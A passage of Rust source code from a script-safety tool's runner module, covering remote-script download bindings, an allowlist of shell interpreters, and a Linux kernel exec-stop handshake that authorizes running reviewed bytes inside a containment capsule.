/// Safe runner. Download/inspection mode is platform-neutral in the core; live
/// execution is Linux-only and refuses before download on every other host.
use std::fs;
use std::io::{self, BufRead, Write};
use std::path::Path;

use sha2::{Digest, Sha256};

use crate::receipt::Receipt;
use crate::script_analysis;
use crate::verdict::{Action, Verdict};

pub struct RunResult {
    /// The exact raw receipt persisted by the runner. This preserves the
    /// long-standing API invariant that `RunResult::receipt` and
    /// `Receipt::load(receipt.sha256)` describe the same record. Public output
    /// callers must use [`RunResult::presentation_receipt_with_compiled`].
    pub receipt: Receipt,
    /// Redacted policy-complete body verdict. `None` only for a deliberately
    /// non-executing inspection whose bytes/interpreter could not be analyzed
    /// completely. The unredacted/raw rule IDs remain confined to the audit path.
    pub verdict: Option<Verdict>,
    pub analysis_complete: bool,
    /// True when complete analysis refused execution (distinct from `--no-exec`
    /// or a user-cancelled prompt). Carries the blocking verdict to JSON callers.
    pub refused: bool,
    pub executed: bool,
    pub exit_code: Option<i32>,
}

impl RunResult {
    /// Build a separately named public receipt projection with one frozen DLP
    /// plan, leaving both the returned raw receipt and persisted record intact.
    pub fn presentation_receipt_with_compiled(
        &self,
        compiled: &crate::redact::CompiledCustomPatterns,
    ) -> Receipt {
        self.receipt.presentation_clone_with_compiled(compiled)
    }
}

/// A pluggable executor for the final "run the downloaded script" step. The core
/// `runner` owns download / hashing / analysis / the confirmation prompt, but the
/// *execution* can be delegated so the CLI crate (E5) can run the interpreter
/// inside the OS containment capsule without `tirith-core` depending on the
/// capsule launcher (which is async/OS-API-bound and lives in the CLI crate).
///
/// Legacy path callback retained for downstream source compatibility. Live
/// execution through this callback is refused because a path cannot preserve
/// the reviewed-object identity contract; use [`VerifiedScriptExecutor`] with
/// [`run_with_verified_executor`] instead. `--no-exec` callers may continue to
/// construct `RunOptions` containing this field because no callback is invoked.
pub type ScriptExecutor = Box<dyn Fn(&str, &std::path::Path) -> Result<i32, String>>;

/// Additive content-bound executor used by Tirith's capsule integration. Unlike
/// the legacy path callback, this API can receive only the runner-constructed
/// immutable reviewed object. The legacy alias remains source-compatible but is
/// refused for live execution.
pub type VerifiedScriptExecutor = Box<
    dyn for<'script> Fn(
        &ScriptInvocation,
        ReviewedScript<'script>,
        &mut ExecutionAuthorizer,
    ) -> Result<i32, String>,
>;

/// One-shot capability handed only to the trusted stopped-target controller.
/// It owns the session gate and can durably authorize exactly one kernel
/// exec-stop transition; dropping it leaves the target unauthorized.
pub struct ExecutionAuthorizer {
    gate: Option<crate::execution_state::ExecutionGate>,
    // Retain the exact content/interpreter/effect authorization through the
    // trusted executor call. The capsule controller can only be reached with
    // this owner alive, so the permit is not reduced to an earlier boolean.
    remote_launch_authorization: Option<AuthorizedRemoteLaunch>,
    #[cfg(target_os = "linux")]
    evidence_id: String,
    #[cfg(target_os = "linux")]
    controller_id: String,
    phase: KernelExecPhase,
    #[cfg(target_os = "linux")]
    channel: Option<TargetLaunchStatusPipe>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
enum KernelExecPhase {
    Fresh,
    Armed,
    Confirming,
    Complete,
    Failed,
}

#[cfg(target_os = "linux")]
pub const TARGET_EXEC_OBSERVED: u8 = b'O';
#[cfg(target_os = "linux")]
pub const TARGET_ACK_RESUME: u8 = b'A';

/// Phase-aware failure from the Linux kernel exec-stop handshake. A successful
/// ACK is irreversible: the tracee may run before the guard can publish its
/// terminal resume status, so every later failure must remain distinguishable
/// from a pre-exec refusal.
#[cfg(target_os = "linux")]
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum KernelExecConfirmationError {
    BeforeAck(String),
    AfterAck(String),
}

#[cfg(target_os = "linux")]
impl KernelExecConfirmationError {
    pub fn reason(&self) -> &str {
        match self {
            Self::BeforeAck(reason) | Self::AfterAck(reason) => reason,
        }
    }

    #[cfg(test)]
    fn contains(&self, pattern: &str) -> bool {
        self.reason().contains(pattern)
    }
}

#[cfg(target_os = "linux")]
impl std::fmt::Display for KernelExecConfirmationError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.reason())
    }
}

#[cfg(target_os = "linux")]
impl std::error::Error for KernelExecConfirmationError {}
#[cfg(target_os = "linux")]
pub const TARGET_LAUNCH_RESUMED: u8 = b'R';
#[cfg(target_os = "linux")]
pub const TARGET_LAUNCH_ERROR: u8 = b'E';
#[cfg(target_os = "linux")]
const TARGET_EXEC_MAX_WAIT: std::time::Duration = std::time::Duration::from_secs(5);

/// Owning, non-clone arm token for the two child-side launch descriptors. Its
/// borrowed descriptors remain valid only while this token is alive, and
/// confirmation consumes it before the core waits for terminal proof.
#[cfg(target_os = "linux")]
#[derive(Debug)]
pub struct KernelExecArm {
    controller_id: String,
    status_writer: std::fs::File,
    ack_guard: std::fs::File,
}

#[cfg(target_os = "linux")]
impl KernelExecArm {
    pub fn launch_status_fd(&self) -> std::os::fd::BorrowedFd<'_> {
        use std::os::fd::AsFd as _;
        self.status_writer.as_fd()
    }

    pub fn launch_ack_fd(&self) -> std::os::fd::BorrowedFd<'_> {
        use std::os::fd::AsFd as _;
        self.ack_guard.as_fd()
    }
}

#[cfg(target_os = "linux")]
#[derive(Debug)]
struct TargetLaunchStatusPipe {
    status_reader: std::fs::File,
    ack_parent: Option<std::fs::File>,
}

#[cfg(target_os = "linux")]
impl TargetLaunchStatusPipe {
    fn create(
        spec: &mut crate::capsule::CapsuleSpec,
        controller_id: String,
    ) -> Result<(Self, KernelExecArm), String> {
        use std::os::fd::{AsRawFd as _, FromRawFd as _};

        let limit = spec.resources.max_open_files.unwrap_or(256).min(256) as i32;
        if limit <= 4 {
            return Err(
                "target-exec status/authorization descriptors cannot fit below the capsule fd limit"
                    .to_string(),
            );
        }

        let mut status_descriptors = [0i32; 2];
        if unsafe { libc::pipe2(status_descriptors.as_mut_ptr(), libc::O_CLOEXEC) } != 0 {
            return Err(format!(
                "create target-exec status channel: {}",
                std::io::Error::last_os_error()
            ));
        }
        // SAFETY: pipe2 returned two uniquely owned descriptors.
        let status_reader_low = unsafe { std::fs::File::from_raw_fd(status_descriptors[0]) };
        let status_writer = unsafe { std::fs::File::from_raw_fd(status_descriptors[1]) };
        let status_reader =
            relocate_parent_endpoint(status_reader_low, limit, "target-exec status reader")?;

        let mut ack_descriptors = [0i32; 2];
        if unsafe {
            libc::socketpair(
                libc::AF_UNIX,
                libc::SOCK_STREAM | libc::SOCK_CLOEXEC,
                0,
                ack_descriptors.as_mut_ptr(),
            )
        } != 0
        {
            return Err(format!(
                "create target-exec authorization channel: {}",
                std::io::Error::last_os_error()
            ));
        }
        // SAFETY: socketpair returned two uniquely owned descriptors.
        let ack_guard = unsafe { std::fs::File::from_raw_fd(ack_descriptors[0]) };
        let ack_parent_low = unsafe { std::fs::File::from_raw_fd(ack_descriptors[1]) };
        let ack_parent =
            relocate_parent_endpoint(ack_parent_low, limit, "target-exec authorization writer")?;

        let status_writer_fd = status_writer.as_raw_fd();
        let ack_guard_fd = ack_guard.as_raw_fd();
        if status_writer_fd < 3
            || status_writer_fd >= limit
            || ack_guard_fd < 3
            || ack_guard_fd >= limit
            || status_writer_fd == ack_guard_fd
            || spec.handles.extra_unix_fds.contains(&status_writer_fd)
            || spec.handles.extra_unix_fds.contains(&ack_guard_fd)
        {
            return Err(
                "target-exec status/authorization descriptors are not distinct non-stdio descriptors within the capsule fd limit"
                    .to_string(),
            );
        }
        spec.handles.extra_unix_fds.push(status_writer_fd);
        spec.handles.extra_unix_fds.push(ack_guard_fd);
        Ok((
            Self {
                status_reader,
                ack_parent: Some(ack_parent),
            },
            KernelExecArm {
                controller_id,
                status_writer,
                ack_guard,
            },
        ))
    }
}

#[cfg(target_os = "linux")]
fn relocate_parent_endpoint(
    endpoint: std::fs::File,
    minimum: std::os::fd::RawFd,
    label: &str,
) -> Result<std::fs::File, String> {
    use std::os::fd::{AsRawFd as _, FromRawFd as _};

    let relocated = unsafe { libc::fcntl(endpoint.as_raw_fd(), libc::F_DUPFD_CLOEXEC, minimum) };
    if relocated < 0 {
        return Err(format!(
            "relocate parent-only {label} above capsule fd limit: {}",
            std::io::Error::last_os_error()
        ));
    }
    // SAFETY: F_DUPFD_CLOEXEC returned a new uniquely owned descriptor. Drop
    // the original low endpoint immediately so only child-owned descriptors
    // consume the capsule's scarce below-limit slots.
    let relocated = unsafe { std::fs::File::from_raw_fd(relocated) };
    drop(endpoint);
    Ok(relocated)
}

impl ExecutionAuthorizer {
    fn new(
        gate: crate::execution_state::ExecutionGate,
        remote_launch_authorization: AuthorizedRemoteLaunch,
    ) -> Self {
        #[cfg(target_os = "linux")]
        let controller_id = uuid::Uuid::new_v4().simple().to_string();
        Self {
            gate: Some(gate),
            remote_launch_authorization: Some(remote_launch_authorization),
            #[cfg(target_os = "linux")]
            evidence_id: format!("kernel-stop-{controller_id}"),
            #[cfg(target_os = "linux")]
            controller_id,
            phase: KernelExecPhase::Fresh,
            #[cfg(target_os = "linux")]
            channel: None,
        }
    }

    #[cfg(target_os = "linux")]
    pub fn arm_linux_capsule(
        &mut self,
        spec: &mut crate::capsule::CapsuleSpec,
    ) -> Result<KernelExecArm, String> {
        if self.phase != KernelExecPhase::Fresh || self.gate.is_none() || self.channel.is_some() {
            self.phase = KernelExecPhase::Failed;
            return Err("kernel exec-stop controller cannot be armed twice".to_string());
        }
        if let Err(error) = self
            .gate
            .as_mut()
            .expect("fresh kernel authorizer retains its gate")
            .begin_kernel_launch_window()
        {
            self.phase = KernelExecPhase::Failed;
            return Err(error);
        }
        let (channel, arm) = match TargetLaunchStatusPipe::create(spec, self.controller_id.clone())
        {
            Ok(created) => created,
            Err(error) => {
                self.phase = KernelExecPhase::Failed;
                return Err(error);
            }
        };
        self.channel = Some(channel);
        self.phase = KernelExecPhase::Armed;
        Ok(arm)
    }

    #[cfg(target_os = "linux")]
    pub fn confirm_linux_capsule(
        &mut self,
        arm: KernelExecArm,
        remaining_budget: std::time::Duration,
        abort_target: impl FnOnce() -> Result<(), String>,
    ) -> Result<(), KernelExecConfirmationError> {
        if self.phase != KernelExecPhase::Armed {
            self.phase = KernelExecPhase::Failed;
            let error = "kernel exec-stop controller is not armed".to_string();
            return match abort_target() {
                Ok(()) => Err(KernelExecConfirmationError::BeforeAck(error)),
                Err(cleanup) => Err(KernelExecConfirmationError::BeforeAck(format!(
                    "{error}; target abort failed: {cleanup}"
                ))),
            };
        }
        if arm.controller_id != self.controller_id {
            self.phase = KernelExecPhase::Failed;
            let error = "kernel exec-stop arm token belongs to a different controller".to_string();
            return match abort_target() {
                Ok(()) => Err(KernelExecConfirmationError::BeforeAck(error)),
                Err(cleanup) => Err(KernelExecConfirmationError::BeforeAck(format!(
                    "{error}; target abort failed: {cleanup}"
                ))),
            };
        }
        self.phase = KernelExecPhase::Confirming;
        let channel = self
            .channel
            .take()
            .ok_or_else(|| "kernel exec-stop channel disappeared before confirmation".to_string());
        let gate = self
            .gate
            .take()
            .ok_or_else(|| "kernel exec-stop gate disappeared before confirmation".to_string());
        let remote_launch_authorization =
            self.remote_launch_authorization.take().ok_or_else(|| {
                "remote-script authorization disappeared before kernel confirmation".to_string()
            });
        // Closing the parent copies of the child endpoints is part of entering
        // confirmation: EOF now reflects the actual capsule guard, not a stale
        // raw descriptor retained by the CLI.
        drop(arm);
        let result = match (channel, gate, remote_launch_authorization) {
            (Ok(channel), Ok(gate), Ok(remote_launch_authorization)) => confirm_linux_kernel_exec(
                channel,
                gate,
                remote_launch_authorization,
                &self.evidence_id,
                remaining_budget,
                abort_target,
            ),
            (channel, gate, remote_launch_authorization) => {
                // Keep whichever channel/gate still exists alive until target
                // cleanup has completed. In particular, never release the
                // stable session lock while an unconfirmed child may run.
                let error = channel
                    .as_ref()
                    .err()
                    .cloned()
                    .or_else(|| gate.as_ref().err().cloned())
                    .or_else(|| remote_launch_authorization.as_ref().err().cloned())
                    .unwrap_or_else(|| "kernel exec-stop controller lost ownership".to_string());
                let abort = abort_target();
                drop(channel);
                drop(gate);
                drop(remote_launch_authorization);
                match abort {
                    Ok(()) => Err(KernelExecConfirmationError::BeforeAck(error)),
                    Err(cleanup) => Err(KernelExecConfirmationError::BeforeAck(format!(
                        "{error}; target abort failed: {cleanup}"
                    ))),
                }
            }
        };
        self.phase = if result.is_ok() {
            KernelExecPhase::Complete
        } else {
            KernelExecPhase::Failed
        };
        result
    }

    fn completed(&self) -> bool {
        self.phase == KernelExecPhase::Complete
            && self.gate.is_none()
            && self.remote_launch_authorization.is_none()
    }
}

#[cfg(target_os = "linux")]
fn confirm_linux_kernel_exec(
    channel: TargetLaunchStatusPipe,
    gate: crate::execution_state::ExecutionGate,
    remote_launch_authorization: AuthorizedRemoteLaunch,
    evidence_id: &str,
    remaining_budget: std::time::Duration,
    abort_target: impl FnOnce() -> Result<(), String>,
) -> Result<(), KernelExecConfirmationError> {
    let now = std::time::Instant::now();
    let Some(requested_deadline) = now.checked_add(remaining_budget.min(TARGET_EXEC_MAX_WAIT))
    else {
        let error = "target-exec confirmation deadline is outside the platform range".to_string();
        return match abort_target() {
            Ok(()) => Err(KernelExecConfirmationError::BeforeAck(error)),
            Err(cleanup) => Err(KernelExecConfirmationError::BeforeAck(format!(
                "{error}; target abort failed: {cleanup}"
            ))),
        };
    };
    let deadline = requested_deadline.min(gate.deadline());
    let stopped_evidence_id = evidence_id.to_string();
    let resumed_evidence_id = evidence_id.replacen("kernel-stop-", "kernel-resumed-", 1);
    confirm_linux_kernel_exec_until(
        channel,
        deadline,
        (Some(gate), Some(remote_launch_authorization)),
        |(gate, remote_launch_authorization)| {
            let remote_launch_authorization = remote_launch_authorization
                .take()
                .ok_or_else(|| "remote-script authorization was already consumed".to_string())?;
            let operation = remote_launch_authorization._binding.operation();
            remote_launch_authorization
                ._permit
                .authorize_effect_at(&operation, chrono::Utc::now())
                .map_err(|error| {
                    format!("remote-script authorization expired before kernel ACK: {error}")
                })?;
            let gate_ref = gate
                .as_mut()
                .ok_or_else(|| "kernel execution gate was already transferred".to_string())?;
            gate_ref.promote_kernel_exec_stopped(stopped_evidence_id)?;
            let gate = gate
                .take()
                .expect("successful stopped promotion retains the execution gate");
            Ok(crate::execution_state::KernelExecutionPermit::from_stopped_gate(gate))
        },
        |permit| permit.promote_resumed(resumed_evidence_id).map(|_| ()),
        abort_target,
    )
}

#[cfg(target_os = "linux")]
fn confirm_linux_kernel_exec_until<AuthorizationState, Permit>(
    mut channel: TargetLaunchStatusPipe,
    deadline: std::time::Instant,
    mut authorization_state: AuthorizationState,
    authorize: impl FnOnce(&mut AuthorizationState) -> Result<Permit, String>,
    finalize: impl FnOnce(&mut Permit) -> Result<(), String>,
    abort_target: impl FnOnce() -> Result<(), String>,
) -> Result<(), KernelExecConfirmationError> {
    use std::io::Read as _;
    use std::os::fd::AsRawFd as _;

    let mut authorize = Some(authorize);
    let mut finalize = Some(finalize);
    let mut permit = None;
    let mut observed = false;
    let mut resumed = false;
    let mut ack_sent = false;
    let mut status = [0u8; 1];
    let protocol = (|| -> Result<(), String> {
        if std::time::Instant::now() >= deadline {
            return Err("target-exec authorization budget expired before observation".to_string());
        }
        loop {
            let now = std::time::Instant::now();
            if now >= deadline {
                return Err(
                    "contained target did not complete authorization before the launch deadline"
                        .to_string(),
                );
            }
            let remaining = deadline - now;
            let timeout_ms = remaining
                .as_millis()
                .saturating_add(1)
                .min(i32::MAX as u128) as i32;
            let mut descriptor = libc::pollfd {
                fd: channel.status_reader.as_raw_fd(),
                events: libc::POLLIN | libc::POLLHUP | libc::POLLERR,
                revents: 0,
            };
            let polled = unsafe { libc::poll(&mut descriptor, 1, timeout_ms) };
            if polled < 0 {
                let error = std::io::Error::last_os_error();
                if error.kind() == std::io::ErrorKind::Interrupted {
                    continue;
                }
                return Err(format!("poll target-exec status channel: {error}"));
            }
            if polled == 0 {
                return Err(
                    "contained target did not cross exec before the launch deadline".to_string(),
                );
            }
            if std::time::Instant::now() >= deadline {
                return Err("contained target status arrived after the launch deadline".to_string());
            }
            match channel.status_reader.read(&mut status) {
                Ok(0) if resumed => {
                    if std::time::Instant::now() >= deadline {
                        return Err(
                            "contained target completed after the launch deadline".to_string()
                        );
                    }
                    let permit = permit.as_mut().ok_or_else(|| {
                        "target resumed without a durable stopped permit".to_string()
                    })?;
                    finalize.take().expect("kernel exec finalizer is one-shot")(permit)?;
                    return Ok(());
                }
                Ok(0) => {
                    return Err(
                        "contained launcher exited before completing target-exec authorization"
                            .to_string(),
                    )
                }
                Ok(_) => match status[0] {
                    TARGET_EXEC_OBSERVED if !observed => {
                        ensure_no_kernel_status_is_queued(
                            channel.status_reader.as_raw_fd(),
                            deadline,
                        )?;
                        if std::time::Instant::now() >= deadline {
                            return Err("target-exec authorization exceeded the launch deadline"
                                .to_string());
                        }
                        let stopped_permit =
                            authorize.take().expect(
                                "kernel exec authorization is consumed only after OBSERVED",
                            )(&mut authorization_state)?;
                        // The stable-lock owner must move into the outer permit
                        // slot before any later deadline, ordering, channel, or
                        // ACK operation can fail. The abort callback therefore
                        // always runs while either `authorization_state` or
                        // `permit` still owns the lock.
                        permit = Some(stopped_permit);
                        if std::time::Instant::now() >= deadline {
                            return Err("target-exec authorization exceeded the launch deadline"
                                .to_string());
                        }
                        ensure_no_kernel_status_is_queued(
                            channel.status_reader.as_raw_fd(),
                            deadline,
                        )?;
                        let ack_parent = channel.ack_parent.take().ok_or_else(|| {
                            "target-exec authorization channel was already consumed".to_string()
                        })?;
                        send_kernel_ack_until(ack_parent.as_raw_fd(), deadline)?;
                        drop(ack_parent);
                        ack_sent = true;
                        observed = true;
                    }
                    TARGET_LAUNCH_ERROR => {
                        return Err("contained target reported an exec failure".to_string())
                    }
                    TARGET_EXEC_OBSERVED => {
                        return Err(
                            "contained target reported duplicate exec observation".to_string()
                        )
                    }
                    TARGET_LAUNCH_RESUMED if observed && !resumed => resumed = true,
                    TARGET_LAUNCH_RESUMED => {
                        return Err("contained target reported out-of-order or duplicate resume"
                            .to_string())
                    }
                    _ => return Err("contained target reported an invalid exec status".to_string()),
                },
                Err(error) if error.kind() == std::io::ErrorKind::Interrupted => continue,
                Err(error) => return Err(format!("read target-exec status channel: {error}")),
            }
        }
    })();

    if let Err(mut error) = protocol {
        // `authorize` owns the fresh gate before OBSERVED; `permit` owns it
        // after the unresolved transition. Both remain in this outer scope
        // until the abort callback has killed and reaped the child tree.
        if let Err(cleanup) = abort_target() {
            error = format!("{error}; target abort failed: {cleanup}");
        }
        return Err(if ack_sent {
            KernelExecConfirmationError::AfterAck(error)
        } else {
            KernelExecConfirmationError::BeforeAck(error)
        });
    }
    Ok(())
}

#[cfg(target_os = "linux")]
fn ensure_no_kernel_status_is_queued(
    fd: std::os::fd::RawFd,
    deadline: std::time::Instant,
) -> Result<(), String> {
    loop {
        if std::time::Instant::now() >= deadline {
            return Err(
                "target-exec status ordering check exceeded the launch deadline".to_string(),
            );
        }
        let mut queued = 0i32;
        if unsafe { libc::ioctl(fd, libc::FIONREAD, &mut queued) } == 0 {
            if queued != 0 {
                return Err(
                    "contained target advanced its exec status before parent authorization"
                        .to_string(),
                );
            }
            return Ok(());
        }
        let error = std::io::Error::last_os_error();
        if error.kind() != std::io::ErrorKind::Interrupted {
            return Err(format!("inspect target-exec status ordering: {error}"));
        }
    }
}

#[cfg(target_os = "linux")]
fn send_kernel_ack_until(
    fd: std::os::fd::RawFd,
    deadline: std::time::Instant,
) -> Result<(), String> {
    let ack = [TARGET_ACK_RESUME];
    loop {
        if std::time::Instant::now() >= deadline {
            return Err("target-exec ACK exceeded the launch deadline".to_string());
        }
        let sent = unsafe {
            libc::send(
                fd,
                ack.as_ptr().cast::<libc::c_void>(),
                ack.len(),
                libc::MSG_NOSIGNAL,
            )
        };
        if sent == 1 {
            return Ok(());
        }
        let error = std::io::Error::last_os_error();
        if sent < 0 && error.kind() == std::io::ErrorKind::Interrupted {
            continue;
        }
        return Err(format!(
            "authorize stopped target resume without SIGPIPE: {error}"
        ));
    }
}

/// Exact bytes approved by the runner and the immutable descriptor that backs
/// file-mode execution. Construction is private to this module: executors can
/// read the approved bytes, and Linux executors can inherit the fully sealed
/// descriptor, but cannot substitute a pathname selected after review.
#[derive(Clone, Copy)]
pub struct ReviewedScript<'a> {
    bytes: &'a [u8],
    #[cfg(target_os = "linux")]
    sealed_fd: std::os::fd::RawFd,
}

impl<'a> ReviewedScript<'a> {
    /// Bytes that completed policy analysis and were re-read from the sealed
    /// execution object immediately before launch.
    pub fn bytes(self) -> &'a [u8] {
        self.bytes
    }

    /// Immutable Linux descriptor containing exactly [`Self::bytes`]. The
    /// caller must keep this borrowed value within the executor invocation.
    #[cfg(target_os = "linux")]
    pub fn sealed_fd(self) -> std::os::fd::RawFd {
        self.sealed_fd
    }
}

/// Shell interpreters that a safe-command rewrite may explicitly preserve.
/// These names are closed and path-free so an attacker cannot turn a generated
/// suggestion into an arbitrary program launch.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PipeInterpreter {
    Sh,
    Bash,
    Zsh,
    Dash,
    Ksh,
    Fish,
    Ash,
}

impl PipeInterpreter {
    /// Stable executable name passed directly to the process launcher.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Sh => "sh",
            Self::Bash => "bash",
            Self::Zsh => "zsh",
            Self::Dash => "dash",
            Self::Ksh => "ksh",
            Self::Fish => "fish",
            Self::Ash => "ash",
        }
    }
}

impl std::fmt::Display for PipeInterpreter {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

impl std::str::FromStr for PipeInterpreter {
    type Err = String;

    fn from_str(value: &str) -> Result<Self, Self::Err> {
        match value {
            "sh" => Ok(Self::Sh),
            "bash" => Ok(Self::Bash),
            "zsh" => Ok(Self::Zsh),
            "dash" => Ok(Self::Dash),
            "ksh" => Ok(Self::Ksh),
            "fish" => Ok(Self::Fish),
            "ash" => Ok(Self::Ash),
            _ => Err(format!(
                "unsupported stdin interpreter {value:?}; expected sh, bash, zsh, dash, ksh, fish, or ash"
            )),
        }
    }
}

/// How the reviewed bytes reach the selected interpreter.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScriptInputMode {
    /// Invoke the interpreter with a fully sealed anonymous descriptor containing
    /// the exact reviewed bytes (manual `tirith run`, Linux only).
    File,
    /// Pipe the reviewed bytes to stdin (safe rewrite of `<fetch> | <shell>`).
    Stdin,
}

/// Exact interpreter invocation selected before download. A forced stdin
/// invocation deliberately overrides any shebang in the remote bytes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptInvocation {
    /// Closed interpreter program name (never an arbitrary generated path).
    pub interpreter: String,
    /// Interpreter identity resolved and validated before the network request.
    /// Forced stdin invocations always carry this; manual file-mode runs retain
    /// their legacy shebang-driven resolution path.
    pub resolved_executable: Option<crate::trusted_child::TrustedExecutable>,
    /// Exact argument boundaries passed without a shell.
    pub args: Vec<String>,
    /// Whether bytes arrive by private path or stdin.
    pub input_mode: ScriptInputMode,
}

/// Validate the narrow argv contract safe-command suggestions can preserve.
/// Every supported shell may read stdin with no arguments. POSIX-family shells
/// additionally support the explicit `-s -- <literal operands...>` form. Fish
/// has no equivalent `-s` contract and therefore remains no-args only.
pub fn pipe_interpreter_args_supported(interpreter: PipeInterpreter, args: &[String]) -> bool {
    if args.is_empty() {
        return true;
    }
    if interpreter == PipeInterpreter::Fish
        || args.len() < 2
        || args[0] != "-s"
        || args[1] != "--"
        || args.len() > 34
    {
        return false;
    }
    args[2..]
        .iter()
        .all(|arg| arg.len() <= 4096 && !arg.is_empty() && !arg.chars().any(char::is_control))
}

/// Caller request corresponding to a verified pipe-to-shell suggestion.
#[derive(Debug, Clone)]
pub struct RequestedPipeInvocation {
    /// The selected shell from the original pipeline.
    pub interpreter: PipeInterpreter,
    /// Narrow, prevalidated literal argv from the original sink.
    pub args: Vec<String>,
}

pub struct RunOptions {
    pub url: String,
    pub no_exec: bool,
    pub interactive: bool,
    pub expected_sha256: Option<String>,
    /// Legacy path executor retained for source compatibility. It is never
    /// invoked for live execution; a non-`None` value with execution enabled is
    /// refused. Use [`run_with_verified_executor`] for contained execution.
    pub exec_fn: Option<ScriptExecutor>,
}

const REMOTE_RUN_REDIRECT_POLICY_V1: &str =
    "max_10;ssrf_guard_each_hop;execute_redirects_https_only";
const REMOTE_INSPECT_REDIRECT_POLICY_V1: &str =
    "max_10;ssrf_guard_each_hop;inspect_redirects_http_or_https";
const REMOTE_FETCH_SAVE_REDIRECT_POLICY_V1: &str =
    "max_10;ssrf_guard_each_hop;save_redirects_http_or_https";

fn remote_run_effects() -> std::collections::BTreeSet<crate::effects::CommandEffectKind> {
    [
        crate::effects::CommandEffectKind::NetworkEgress,
        crate::effects::CommandEffectKind::FilesystemWrite,
        crate::effects::CommandEffectKind::PersistenceChange,
    ]
    .into_iter()
    .collect()
}

/// Exact, pure binding for one Tirith-owned remote-run transaction.
///
/// Construction performs syntax and literal-IP validation only. Domain DNS is
/// intentionally deferred until the resulting pending authorization has been
/// consumed inside the runner.
pub struct RemoteRunBoundaryBinding {
    envelope: crate::task::TaskEnvelopeInput,
    effects: std::collections::BTreeSet<crate::effects::CommandEffectKind>,
    destination: Option<crate::util::ContainedAtomicFile>,
}

impl RemoteRunBoundaryBinding {
    pub fn operation(&self) -> crate::task_boundary::BoundaryOperation<'_> {
        crate::task_boundary::BoundaryOperation {
            boundary: crate::task_boundary::OwnedBoundary::RemoteScriptRun,
            envelope: &self.envelope,
            adapter: crate::task::IngressAdapter::Unattributed,
            boundary_effects: self.effects.clone(),
        }
    }

    fn destination(&self) -> Option<&crate::util::ContainedAtomicFile> {
        self.destination.as_ref()
    }
}

pub fn remote_run_boundary_binding(
    url: &str,
    expected_sha256: Option<&str>,
    no_exec: bool,
    requested_pipe_invocation: Option<&RequestedPipeInvocation>,
) -> Result<RemoteRunBoundaryBinding, String> {
    let parsed = crate::url_validate::validate_fetch_url_syntax(url)?;
    let expected_sha256 = normalize_sha256_pin(expected_sha256)?;
    let pipe = requested_pipe_invocation.map(|requested| {
        serde_json::json!({
            "interpreter": requested.interpreter.as_str(),
            "argv": &requested.args,
        })
    });
    let projection = serde_json::json!({
        "projection_version": 2,
        "kind": "remote_run",
        "canonical_url": parsed.as_str(),
        "expected_sha256": expected_sha256,
        "purpose": if no_exec { "inspect" } else { "execute" },
        "no_exec": no_exec,
        "redirect_policy": if no_exec {
            REMOTE_INSPECT_REDIRECT_POLICY_V1
        } else {
            REMOTE_RUN_REDIRECT_POLICY_V1
        },
        "pipe_invocation": pipe,
    });
    let projection_sha256 =
        sha256_hex(crate::audit::canonical_json_for_hash(&projection).as_bytes());
    let mut envelope = crate::task_boundary::shell_envelope(parsed.as_str());
    envelope.sources[0].content = format!("tirith-remote-run:v2:sha256:{projection_sha256}");
    Ok(RemoteRunBoundaryBinding {
        envelope,
        effects: remote_run_effects(),
        destination: None,
    })
}

/// Exact, pure binding for `tirith fetch --save`, including the absolute
/// destination identity and the durable taint-record side effect.
pub fn remote_fetch_save_boundary_binding(
    url: &str,
    dest: &Path,
    expected_sha256: Option<&str>,
) -> Result<RemoteRunBoundaryBinding, String> {
    let parsed = crate::url_validate::validate_fetch_url_syntax(url)?;
    let expected_sha256 = normalize_sha256_pin(expected_sha256)?;
    let absolute_dest = std::path::absolute(dest)
        .map_err(|error| format!("resolve absolute fetch destination: {error}"))?;
    let parent = absolute_dest
        .parent()
        .ok_or_else(|| "fetch destination has no parent directory".to_string())?;
    let destination = crate::util::ContainedAtomicFile::prepare(parent, &absolute_dest, false)
        .map_err(|error| format!("bind retained fetch destination: {error}"))?;
    let destination_identity = contained_destination_identity(&destination)?;
    let projection = serde_json::json!({
        "projection_version": 1,
        "kind": "remote_fetch_save",
        "canonical_url": parsed.as_str(),
        "expected_sha256": expected_sha256,
        "destination_identity_sha256": destination_identity,
        "purpose": "save_and_mark_tainted",
        "redirect_policy": REMOTE_FETCH_SAVE_REDIRECT_POLICY_V1,
    });
    Ok(remote_download_binding(
        parsed.as_str(),
        "tirith-fetch-save:v1",
        projection,
        destination,
    ))
}

/// Exact pre-network binding for command-card fetch. The final filename is
/// content-addressed and therefore unknowable before the authorized response;
/// the binding instead commits to the exact absolute cache root and the fixed
/// `sha256(valid-card-bytes).json` destination derivation.
pub fn remote_command_card_cache_boundary_binding(
    url: &str,
    cache_dir: &Path,
    card_read_cap: u64,
) -> Result<RemoteRunBoundaryBinding, String> {
    let parsed = crate::url_validate::validate_fetch_url_syntax(url)?;
    let absolute_cache = std::path::absolute(cache_dir)
        .map_err(|error| format!("resolve absolute command-card cache root: {error}"))?;
    let parent = absolute_cache
        .parent()
        .ok_or_else(|| "command-card cache root has no parent directory".to_string())?;
    let destination = crate::util::ContainedAtomicFile::prepare(parent, &absolute_cache, false)
        .map_err(|error| format!("bind retained command-card cache root: {error}"))?;
    let cache_root_identity = contained_destination_identity(&destination)?;
    let projection = serde_json::json!({
        "projection_version": 1,
        "kind": "remote_command_card_cache",
        "canonical_url": parsed.as_str(),
        "expected_sha256": null,
        "cache_root_identity_sha256": cache_root_identity,
        "destination_derivation": "sha256(valid-card-bytes).json",
        "card_read_cap": card_read_cap,
        "purpose": "validate_and_cache_command_card",
        "redirect_policy": REMOTE_FETCH_SAVE_REDIRECT_POLICY_V1,
    });
    Ok(remote_download_binding(
        parsed.as_str(),
        "tirith-command-card-cache:v1",
        projection,
        destination,
    ))
}

fn contained_destination_identity(
    destination: &crate::util::ContainedAtomicFile,
) -> Result<String, String> {
    let identity = destination
        .binding_identity()
        .map_err(|error| format!("inspect retained destination identity: {error}"))?;
    Ok(sha256_hex(
